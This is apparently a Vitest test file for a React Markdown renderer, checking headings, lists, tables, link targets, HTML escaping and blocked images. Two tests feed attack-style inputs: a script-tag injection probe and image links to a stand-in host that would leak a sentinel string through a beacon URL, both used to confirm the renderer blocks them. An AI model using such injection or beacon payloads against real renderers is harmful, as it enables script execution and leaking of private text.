import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vitest";
import { LONG_CONTENT } from "@/test-fixtures/long-content";
import { MarkdownDocument } from "./markdown";

function render(content: string) {
  return renderToStaticMarkup(<MarkdownDocument content={content} />);
}

describe("MarkdownDocument", () => {
  it("renders report Markdown structure as HTML", () => {
    const cases = [
      {
        label: "headings as a hierarchy instead of literal hashes",
        content: "# Summary\n\n## Key points\n\n### Detail",
        expected: [
          "<h1>Summary</h1>",
          "<h2>Key points</h2>",
          "<h3>Detail</h3>",
        ],
        forbidden: ["# Summary"],
      },
      {
        label: "emphasis, lists, and blockquotes",
        content: [
          "**Decided** to ship.",
          "",
          "- first point",
          "- second point",
          "",
          "1. step one",
          "2. step two",
          "",
          "> An open question.",
        ].join("\n"),
        expected: [
          "<strong>Decided</strong>",
          "<li>first point</li>",
          "<ol>",
          "<blockquote>",
        ],
        forbidden: ["**Decided**"],
      },
      {
        label: "GFM task lists as checkboxes",
        content: "- [x] shipped\n- [ ] pending",
        expected: ['type="checkbox"', "checked"],
        forbidden: ["[x]"],
      },
      {
        label: "fenced code blocks without collapsing whitespace",
        content: "```text\nsummary   4,800 tokens\n```",
        expected: ["<pre>", "<code", "summary   4,800 tokens"],
        forbidden: [],
      },
    ];

    for (const { label, content, expected, forbidden } of cases) {
      const markup = render(content);

      for (const fragment of expected) {
        expect(markup, label).toContain(fragment);
      }
      for (const literal of forbidden) {
        expect(markup, label).not.toContain(literal);
      }
    }
  });

  it("renders GFM tables inside a horizontal scroll container", () => {
    const markup = render(
      ["| Decision | Owner |", "| --- | --- |", "| Ship it | 희찬 |"].join("\n"),
    );

    // The page is overflow-x: hidden, so a wide table must scroll in its own box.
    expect(markup).toContain('class="markdown-doc__scroll"');
    expect(markup).toContain("<th>Decision</th>");
    expect(markup).toContain("<td>Ship it</td>");
    expect(markup).not.toContain("| --- |");
  });

  it("opens links outside the app window", () => {
    const markup = render("[docs](https://example.com/report)");

    expect(markup).toContain('href="https://example.com/report"');
    expect(markup).toContain('target="_blank"');
    expect(markup).toContain('rel="noreferrer noopener"');
  });

  it("escapes embedded HTML instead of trusting model output", () => {
    const markup = render("Plain <script>alert('x')</script> text");

    expect(markup).not.toContain("<script>");
    expect(markup).toContain("&lt;script&gt;");
  });

  it("does not load images from untrusted report content", () => {
    const contents = [
      "![Summary](https://untrusted.invalid/beacon?text=PRIVATE_SENTINEL)",
      "![Summary][image]\n\n[image]: https://untrusted.invalid/beacon?text=PRIVATE_SENTINEL",
      "![Summary](//untrusted.invalid/beacon?text=PRIVATE_SENTINEL)",
      "![Summary](./beacon?text=PRIVATE_SENTINEL)",
    ];

    for (const content of contents) {
      const markup = render(content);
      expect(markup, content).toContain("Summary");
      expect(markup, content).not.toContain("<img");
      expect(markup, content).not.toContain("<link");
      expect(markup, content).not.toContain("PRIVATE_SENTINEL");
    }
  });

  it("keeps long unbroken values inside the document", () => {
    const markup = render(`${LONG_CONTENT.korean}\n\n${LONG_CONTENT.token}`);

    expect(markup).toContain('class="markdown-doc"');
    expect(markup).toContain(LONG_CONTENT.korean);
    expect(markup).toContain(LONG_CONTENT.token);
  });

  it("renders nothing but the container for empty content", () => {
    const markup = render("");

    expect(markup).toContain('data-slot="markdown-document"');
    expect(markup).not.toContain("<h1>");
  });
});
